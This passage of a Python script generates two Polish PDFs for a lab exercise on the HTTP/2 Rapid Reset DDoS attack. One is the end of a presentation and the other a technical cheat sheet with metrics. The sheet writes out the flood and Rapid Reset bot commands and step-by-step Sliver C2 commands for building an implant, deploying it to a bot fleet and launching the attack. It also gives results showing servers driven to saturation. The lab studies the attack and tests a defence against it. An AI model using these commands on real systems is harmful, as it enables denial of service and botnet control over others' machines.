    "&#8222;To sum up: we <b>showed the attack from the inside</b> — how it works and how to measure it — and we <b>proved the "
    "defense works</b>: the nginx patch plus rate-limiting keep the victim at 2 percent CPU and reject the attack at the edge. "
    "All results are reproducible and documented in the repository.")
story.append(SP(6))
story.append(box([Paragraph("Mini-słowniczek EN (gdyby padło pytanie)", st_lbl),
    P("stream = strumień · header = nagłówek · to reset/cancel a stream = anulować strumień · "
      "rate-limiting = ograniczanie liczby żądań · asymmetry of cost = asymetria kosztu · "
      "patched / vulnerable = załatany / podatny · botnet = sieć przejętych maszyn · "
      "Command &amp; Control (C2) = serwer sterujący botnetem.", st_body)]))

doc = SimpleDocTemplate(os.path.join(OUT,"prezentacja-background.pdf"), pagesize=A4,
    leftMargin=20*mm, rightMargin=20*mm, topMargin=18*mm, bottomMargin=20*mm,
    title="HTTP/2 Rapid Reset — prezentacja", author="DDoS Lab")
doc.build(story, onFirstPage=footer, onLaterPages=footer)
print("OK prezentacja-background.pdf")

# =====================================================================
#  PDF 2 — RAPORT TECHNICZNY (ściąga: komendy + metryki)
# =====================================================================
r = []
r.append(Paragraph("Raport techniczny — ściąga", st_title))
r.append(Paragraph("Komendy, metryki i wyniki laboratorium HTTP/2 Rapid Reset (do Twojego wglądu)", st_sub))
r.append(SP(6)); r.append(RULE(ACC,2)); r.append(SP(2))

r.append(H1("1. Struktura stanowiska"))
r.append(CODE(
"ddos-lab/\n"
"  docker-compose.yml + *.override/hardening/monitoring/victims.yml\n"
"  victim/   nginx: normal.conf | hardened.conf; Dockerfile.labvic (BASE=stary/nowy)\n"
"  bot/      narzedzie rapidreset (HEADERS + RST_STREAM w petli)\n"
"  loadgen/  h2load (generator floodu HTTP/2)\n"
"  c2/       Sliver: bin/sliver-server, data/ (implant)\n"
"  monitoring/ Zabbix: provision.py, alerts.py (API timeout 15->120 s)\n"
"  lab-results/ scripts/ + data/ (CSV) + report/raport.html"))

r.append(H1("2. Jak postawić lab"))
r.append(H2("Podstawowy lab (siec labnet + ofiara + bot + c2)"))
r.append(CODE("docker compose up -d --build"))
r.append(H2("Monitoring Zabbix (frontend http://localhost:8080, Admin / zabbix)"))
r.append(CODE(
"docker compose -f docker-compose.yml -f docker-compose.override.yml \\\n"
"  -f docker-compose.monitoring.yml up -d --build zabbix-db zabbix-server zabbix-web\n"
"docker compose -f docker-compose.yml -f docker-compose.override.yml \\\n"
"  -f docker-compose.monitoring.yml run --rm zabbix-provision"))

r.append(H1("3. Tor 1 — flood h2load (bez obrony / z obroną)"))
r.append(P("Generator floodu HTTP/2; -c = liczba rownoleglych polaczen (naTEŻenie). Przyklad przebiegu:", st_body))
r.append(CODE("h2load -c 25 -D 30 https://victim:443/     # ~40% CPU ofiary bez obrony"))
r.append(P("Odczyt skutecznosci z podsumowania h2load: linia &#8222;status codes: N 2xx ... M 4xx&#8221; "
    "→ 2xx = sukces, 4xx/429 = odrzucone przez rate-limiting.", st_note))

r.append(H1("4. Tor 1b — autentyczny Rapid Reset (bot)"))
r.append(CODE("rapidreset -url https://victim:443 -requests 20000 -concurrency 1000"))
r.append(P("Dowod ataku = zliczone ramki: HEADERS (otwarcia) i RST_STREAM (anulowania).", st_note))

r.append(H1("5. Tor 2 — botnet + C2 Sliver"))
r.append(H2("Jedna komenda (automat)"))
r.append(CODE("FLEET=5 DURATION=120 bash lab-results/scripts/run-c2-attack.sh"))
r.append(P("Robi: listener mTLS → generate implanta (cache c2/data/botimplant) → deploy na flote → "
    "czeka na sesje → execute /attack.sh na kazdym bocie → dowod do data/c2-proof.txt.", st_note))
r.append(H2("Procedura reczna (konsola Slivera)"))
r.append(CODE(
"docker compose exec c2 /opt/sliver/sliver-server\n"
"mtls --lport 8888\n"
"generate --mtls lab-c2:8888 --os linux --arch amd64 --skip-symbols --save /root/.sliver/implant\n"
"# deploy: docker cp c2/data/implant lab-botK:/implant ; docker exec -d lab-botK /implant\n"
"sessions ; use <ID> ; execute /attack.sh"))

r.append(H2("Matryca obciazen (mocny PC / GCP)"))
r.append(CODE('SIZES="1 5 10 20 30" BOT_CPUS=0.3 VIC_CPUS=1.0 CONC=600 \\\n  bash lab-results/scripts/run-botnet-matrix.sh\n# slabszy serwer (prog nokautu): VIC_CPUS=0.5 lub 0.25, SIZES "10 20 30 40 50"'))
r.append(PageBreak())

r.append(H1("6. Metryki — skad liczby"))
mt = [["Metryka","Zrodlo","Jednostka"],
    ["CPU ofiary","cgroup v2 /sys/fs/cgroup/cpu.stat (delta usage_usec)","% / 1 s"],
    ["Polaczenia aktywne","nginx stub_status (Active connections)","liczba"],
    ["Zadania total","nginx stub_status (licznik requests)","liczba"],
    ["2xx / 429","podsumowanie klienta h2load (status codes)","liczba"],
    ["HEADERS / RST_STREAM","licznik ramek wyslanych przez bota rapidreset","liczba"],
]
r.append(dtable(mt, [38*mm, 97*mm, 35*mm]))

r.append(H1("7. Wyniki — Tor 1 (flood)"))
r.append(dtable(t1, [16*mm, 18*mm, 32*mm, 34*mm, 30*mm, 34*mm],
                align={0:"CENTER",1:"CENTER",2:"CENTER",3:"CENTER",4:"CENTER",5:"CENTER"}))
r.append(Paragraph("Bez obrony: CPU rosnie z natezeniem, atak przechodzi (2xx). Z hardeningiem: CPU plasko ~2%, ruch odbijany 429.", st_cap))

r.append(H1("8. Wyniki — Rapid Reset (bot, 40 s)"))
r.append(dtable(t2, [42*mm, 34*mm, 94*mm], align={1:"CENTER"}))

r.append(H1("9. Wyniki — matryca botnet (GCP 8 vCPU, realne)"))
r.append(H2("Siła ognia vs rozmiar botnetu (serwer 1 rdzeń) — data/botnet_vic1.csv"))
bn = [["Boty","1","5","10","20","30"],
    ["Zagreg. RST/s","~2,6k","~15k","~37k","~85k","~130k"],
    ["CPU ofiary","11%","42%","75%","95%","zagłodz."],
    ["Latencja usera","8 ms","9 ms","9 ms","15–20 ms","130–360 ms"],
]
r.append(dtable(bn, [34*mm, 22*mm, 22*mm, 22*mm, 24*mm, 28*mm],
                align={1:"CENTER",2:"CENTER",3:"CENTER",4:"CENTER",5:"CENTER"}))
r.append(Paragraph("~4 000 RST/s na bota. Nasycenie 1-rdzeniowego nginx ~20 botow; przy 30 latencja realnego usera 15–40x gorsza.", st_cap))
r.append(H2("Próg odmowy usługi vs zasoby serwera — botnet_vic05.csv / botnet_vic025.csv"))
tt = [["Serwer (limit CPU)","Szczyt latencji usera","Dostepnosc (ok%)","Wniosek"],
    ["1 rdzen (normalny)","360 ms @30 botow","100%","nginx odporny"],
    ["0,5 rdzenia (slaby)","667 ms @50 botow","~100% (92% sporadycznie)","degradacja"],
    ["0,25 rdzenia (b.slaby)","1,7 s @35–50 botow","83% (17% pada)","CZESCIOWE DoS"],
]
r.append(dtable(tt, [36*mm, 38*mm, 46*mm, 34*mm], header_bg=ACC))
r.append(Paragraph("stary=nowy i hardened~normal zachowuja sie niemal identycznie (keepalive_requests czyni Rapid Reset tanim).", st_cap))

r.append(H1("10. Dowód C2 Sliver (data/c2-proof.txt)"))
r.append(box([
    BL("Sliver v1.7.9: implant mTLS zbudowany (<b>generate --mtls lab-c2:8888 --os linux</b>, 15 MB, linux/amd64)."),
    BL("<b>6 implantow z 6 roznych IP</b> zglosilo sie do C2 jako zywe sesje mTLS (osobne kontenery = osobne IP)."),
    BL("Operator: <font name='Mono' size='9'>use &lt;ID&gt; ; execute /attack.sh</font> — atak floty nasycil ofiare do <b>CPU 100%</b>."),
    BL("Uwaga: implant Slivera wymaga glibc -> boty C2 na Debianie; rapidreset (statyczny Go) dziala i tam."),
]))

r.append(H1("11. Kluczowe liczby do zapamietania"))
r.append(box([
    BL("Flood (Tor 1) bez obrony: CPU ofiary <b>~18% → ~80%</b>; z hardeningiem <b>plasko ~2%</b>, ruch odbijany 429 (do 4951)."),
    BL("Rapid Reset (1 bot, lab): sygnatura <b>dziesiatki tys. HEADERS / setki tys. RST_STREAM</b> / <b>0</b> sukcesow."),
    BL("Botnet: <b>~4 000 RST/s na bota</b>; 50 botow ~ <b>176 000 RST/s</b>; nasycenie 1-rdz nginx ~20 botow."),
    BL("Nokaut: na serwerze 0,25 rdzenia <b>~17% zadan realnych userow pada</b>, latencja do 1,7 s."),
    BL("C2: <b>6 sesji mTLS Sliver</b> (6 IP) -> atak floty -> CPU ofiary <b>100%</b>."),
]))
r.append(SP(6))
r.append(Paragraph("Repozytorium: branch lab-experiments (skrypty, CSV: botnet_vic1/05/025.csv, c2-proof.txt, raport.html, as-run/).", st_note))

doc2 = SimpleDocTemplate(os.path.join(OUT,"raport-techniczny.pdf"), pagesize=A4,
    leftMargin=20*mm, rightMargin=20*mm, topMargin=18*mm, bottomMargin=20*mm,
    title="Raport techniczny — DDoS Lab", author="DDoS Lab")
doc2.build(r, onFirstPage=footer, onLaterPages=footer)
print("OK raport-techniczny.pdf")
print("DIR:", OUT)
